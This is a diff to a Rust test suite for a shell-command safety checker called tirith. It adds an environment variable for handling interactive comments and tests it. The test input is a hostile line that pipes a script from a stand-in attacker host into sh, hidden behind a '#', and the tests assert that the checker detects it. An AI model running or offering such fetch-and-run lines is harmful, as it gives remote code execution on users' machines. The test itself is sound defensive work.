@@ -86,6 +86,7 @@ fn tirith() -> Command {
         "TIRITH_SESSION_ID",
         "TIRITH_INTEGRATION",
         "TIRITH_INTEGRATION_VERSION",
+        "_TIRITH_INTERACTIVE_COMMENTS",
     ] {
         cmd.env_remove(key);
     }
@@ -3360,15 +3361,30 @@ fn paste_process_level_bypass_still_honored_with_interactive_flag() {
     );
 }
 
-/// The bash and zsh hooks pass `--no-interactive-comments` when their shell
-/// runs the text after a word-start `#` (zsh's default). `check` and `paste`
-/// accept it, read interactive POSIX input that way, document it in `--help`,
-/// and without it (or for non-interactive input) a word-start `#` is a comment.
+/// When their shell runs the text after a word-start `#` (zsh's default), the
+/// bash and zsh hooks set `_TIRITH_INTERACTIVE_COMMENTS=0`, which an older
+/// binary ignores; `--no-interactive-comments` says the same on the command
+/// line. `check` and `paste` read interactive POSIX input that way with
+/// either, document the flag in `--help`, and without both (or for
+/// non-interactive input) a word-start `#` is a comment.
 #[test]
 fn check_and_paste_accept_no_interactive_comments() {
     use std::io::Write;
     let run = |subcommand: &str, flags: &[&str], input: &str| {
         let mut command = tirith();
+        let flags: Vec<&str> = flags
+            .iter()
+            .copied()
+            .filter(
+                |flag| match flag.strip_prefix("_TIRITH_INTERACTIVE_COMMENTS=") {
+                    Some(value) => {
+                        command.env("_TIRITH_INTERACTIVE_COMMENTS", value);
+                        false
+                    }
+                    None => true,
+                },
+            )
+            .collect();
         if subcommand == "check" {
             command
                 .args(["check", "--offline", "--no-daemon", "--format", "json"])
@@ -3397,16 +3413,22 @@ fn check_and_paste_accept_no_interactive_comments() {
     };
     let hidden = "echo hi #; curl https://evil.example/x | sh";
     for subcommand in ["check", "paste"] {
-        let (code, stdout) = run(
-            subcommand,
-            &["--interactive", "--no-interactive-comments"],
-            hidden,
-        );
-        assert_eq!(code, Some(1), "{subcommand}: {stdout}");
-        assert!(stdout.contains("curl_pipe_shell"), "{subcommand}: {stdout}");
+        for flags in [
+            &["--interactive", "--no-interactive-comments"][..],
+            &["--interactive", "_TIRITH_INTERACTIVE_COMMENTS=0"][..],
+        ] {
+            let (code, stdout) = run(subcommand, flags, hidden);
+            assert_eq!(code, Some(1), "{subcommand} {flags:?}: {stdout}");
+            assert!(
+                stdout.contains("curl_pipe_shell"),
+                "{subcommand} {flags:?}: {stdout}"
+            );
+        }
         for flags in [
             &["--interactive"][..],
+            &["--interactive", "_TIRITH_INTERACTIVE_COMMENTS=1"][..],
             &["--non-interactive", "--no-interactive-comments"][..],
+            &["--non-interactive", "_TIRITH_INTERACTIVE_COMMENTS=0"][..],
         ] {
             let (code, stdout) = run(subcommand, flags, hidden);
             assert_eq!(code, Some(0), "{subcommand} {flags:?}: {stdout}");
